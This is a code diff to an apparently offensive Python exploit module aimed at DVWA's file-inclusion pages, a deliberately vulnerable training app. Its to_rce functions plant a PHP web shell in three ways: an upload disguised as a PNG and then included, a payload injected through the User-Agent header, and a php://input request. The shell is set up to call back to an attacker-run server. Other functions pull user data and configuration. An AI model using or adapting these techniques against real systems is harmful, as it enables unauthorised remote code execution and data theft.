@@ -2,11 +2,10 @@
 import requests
 import time
 import base64
-import random
-from bs4 import BeautifulSoup
 from urllib.parse import urljoin , urlencode , urlparse
 from core.network import *
 from core.common import *
+
 
 def get_users_info(url,cookies,headers):
     payload = {
@@ -24,6 +23,7 @@ def get_users_info(url,cookies,headers):
 
     print("\t\t",end='')
     print(html_content.split(delimiter)[0].strip().replace("\n","\n\t\t"))
+
 
 def get_config(url,cookies,headers):
 
@@ -62,7 +62,7 @@ def get_config(url,cookies,headers):
 
 
 def to_rce(url,cookies,headers,server):
-    shell_name = str(random.randint(11111,99999))
+    shell_name = random_shell_name()
     payload = php_payload(lhost=server.host,lport=server.port,shell_name=shell_name)
     
     if upload_file(url,cookies,'stager.png',payload,'image/png'):
@@ -72,7 +72,7 @@ def to_rce(url,cookies,headers,server):
 
         lfi_request_file(url,cookies,headers,'../../hackable/uploads/stager.png')
         
-        shell_path = urljoin(url,'vulnerabilities/fi/' + shell_name + '.php')
+        shell_path = urljoin(url,'vulnerabilities/fi/' + shell_name)
         check_exploit_succeed(shell_path,headers)
 
     else:
@@ -88,7 +88,7 @@ def to_rce2(url,cookies,headers,server):
     
     if 'HTTP_USER_AGENT' in res.text:
         host = urlparse(url).hostname
-        shell_name = str(random.randint(11111,99999))
+        shell_name = random_shell_name()
         payload = php_payload(lhost=server.host,lport=server.port,shell_name=shell_name)
         injected_headers = makeHeaders(host, userAgent = payload)
         
@@ -97,7 +97,7 @@ def to_rce2(url,cookies,headers,server):
 
         lfi_request_file(url,cookies,injected_headers,writeable_file)
         time.sleep(5)
-        shell_path = urljoin(url,'vulnerabilities/fi/' + shell_name + '.php')
+        shell_path = urljoin(url,'vulnerabilities/fi/' + shell_name)
         check_exploit_succeed(shell_path,headers)
 
     else:
@@ -105,15 +105,14 @@ def to_rce2(url,cookies,headers,server):
 
 
 def to_rce3(url,cookies,headers,server):
-    
-    shell_name = str(random.randint(11111,99999))
+    shell_name = random_shell_name()
     payload = php_payload(lhost=server.host,lport=server.port,shell_name=shell_name)
     vulnerable_path = "vulnerabilities/fi/?"
     full_url = urljoin(url,vulnerable_path + urlencode({'page' : "php://input"}))
     res = requests.get(full_url,cookies=cookies,headers=headers,data=payload)
 
     if 'failed to open stream: Success in' not in res.text:
-        shell_path = urljoin(url,'vulnerabilities/fi/' + shell_name + '.php')
+        shell_path = urljoin(url,'vulnerabilities/fi/' + shell_name)
         time.sleep(5)
         check_exploit_succeed(shell_path,headers)
 
@@ -126,11 +125,12 @@ def exploit(url,cookies = {}):
 
     # Handle Http Server
     host = urlparse(url).hostname
-    headers = makeHeaders(host)
-    ip = ip_on_same_network(host) if ip_on_same_network(host) else get_public_ip()
+    ip = get_my_ip(host)
     port = 8000
     s = WebServer(ip,port)
     s.run()
+
+    headers = makeHeaders(host)
 
     # First techniqe
 
